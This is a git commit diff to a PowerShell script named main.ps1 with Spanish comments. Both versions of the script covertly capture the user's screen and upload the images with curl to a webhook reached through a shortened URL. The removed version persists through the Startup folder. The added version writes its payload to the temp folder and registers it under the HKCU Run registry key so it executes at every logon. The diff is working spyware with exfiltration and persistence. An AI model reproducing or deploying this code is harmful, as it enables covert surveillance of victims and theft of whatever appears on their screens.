12dcf8e6076fd34310838c31d25448ec2e96e354
Gerper90 <43889986+Gerper90@users.noreply.github.com>
2024-02-08 23:15:04 -0500

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,41 +1,43 @@
-# Contenido del script
-$hookurl = "https://bit.ly/Screen_dc"
-$seconds = 30 # Intervalo entre capturas (en segundos)
-$imagesToSend = 2 # Cantidad de imágenes a enviar
+# Especifica el contenido del script que se descargará y ejecutará automáticamente
+$autoDownloadScript = @"
+# Script original
+\$hookurl = "\$dc"
+\$seconds = 30 # Screenshot interval
+\$a = 1 # Sceenshot amount
 
-# Detección de URL acortada
-if ($hookurl.Length -ne 121) {
-    Write-Host "URL del webhook acortada detectada..." 
-    $hookurl = (irm $hookurl).url
-}
+# shortened URL Detection
+if (\$hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; \$hookurl = (irm \$hookurl).url}
 
-# Obtener la ruta de la carpeta de inicio del usuario
-$StartupFolder = [Environment]::GetFolderPath("Startup")
-
-# Ruta del script principal
-$ScriptPath = Join-Path -Path $StartupFolder -ChildPath "system.ps1"
-
-# Descargar el script en la carpeta de inicio
-$ScriptContent = @"
-while ($true) {
-    for ($i=0; $i -lt $imagesToSend; $i++) {
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
-        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-        $Width = $Screen.Width
-        $Height = $Screen.Height
-        $Bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-        $Graphic = [System.Drawing.Graphics]::FromImage($Bitmap)
-        $Graphic.CopyFromScreen(0, 0, 0, 0, $Bitmap.Size)
-        $FilePath = "$env:temp\SC$i.png"
-        $Bitmap.Save($FilePath, [System.Drawing.Imaging.ImageFormat]::Png)
-        curl.exe -F "file1=@$FilePath" $hookurl
-        Remove-Item -Path $FilePath
-    }
-    Start-Sleep $seconds
+While (\$a -gt 0){
+    \$Filett = "\$env:temp\SC.png"
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
+    \$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    \$Width = \$Screen.Width
+    \$Height = \$Screen.Height
+    \$Left = \$Screen.Left
+    \$Top = \$Screen.Top
+    \$bitmap = New-Object System.Drawing.Bitmap \$Width, \$Height
+    \$graphic = [System.Drawing.Graphics]::FromImage(\$bitmap)
+    \$graphic.CopyFromScreen(\$Left, \$Top, 0, 0, \$bitmap.Size)
+    \$bitmap.Save(\$Filett, [System.Drawing.Imaging.ImageFormat]::png)
+    Start-Sleep 1
+    curl.exe -F "file1=@\$filett" \$hookurl
+    Start-Sleep 1
+    Remove-Item -Path \$filett
+    Start-Sleep \$seconds
+    \$a--
 }
 "@
-$ScriptContent | Out-File -FilePath $ScriptPath -Encoding utf8
 
-Write-Host "Script descargado y configurado para ejecutarse al iniciar Windows!!!"
+# Especifica la ubicación donde se guardará el script
+$scriptPath = "$env:temp\script.ps1"
 
+# Guarda el script en la ubicación especificada
+Set-Content -Path $scriptPath -Value $autoDownloadScript
+
+# Agrega una entrada al Registro de Windows para ejecutar el script al iniciar sesión del usuario
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regName = "EjecutarScript"
+$regValue = $scriptPath
+New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
